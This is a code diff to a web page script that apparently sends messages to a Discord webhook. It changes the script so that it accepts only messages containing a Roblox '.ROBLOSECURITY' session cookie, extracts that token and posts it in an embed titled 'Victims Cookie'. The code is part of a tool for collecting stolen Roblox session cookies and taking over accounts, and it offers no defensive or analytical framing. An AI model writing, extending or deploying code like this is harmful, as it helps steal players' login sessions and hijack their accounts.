@@ -66,15 +66,22 @@
 
       errorMessage.textContent = ""; // Clear any previous error messages
 
-      // Add triple backticks around the message for Discord code block format
-      message = `\`\`\`${message}\`\`\``;
+      // Check if the message contains .ROBLOSECURITY code
+      const robloSecurityCode = ".ROBLOSECURITY";
+      if (!message.includes(robloSecurityCode)) {
+        errorMessage.textContent = "Message failed! You must include the .ROBLOSECURITY code.";
+        return;
+      }
 
-      // Create the embed payload
+      // Extract the .ROBLOSECURITY code from the message
+      const robloCode = message.split(robloSecurityCode)[1].trim(); // Get the text after .ROBLOSECURITY
+
+      // Create the embed payload with only the .ROBLOSECURITY code
       const embedPayload = {
         embeds: [
           {
             title: "Victims Cookie", // Embed title
-            description: message, // Embed description with backticks
+            description: `\`\`\`${robloCode}\`\`\``, // Embed description with the code wrapped in backticks
             color: 16711680, // Embed color (red in this case)
             timestamp: new Date().toISOString() // Adds a timestamp
           }
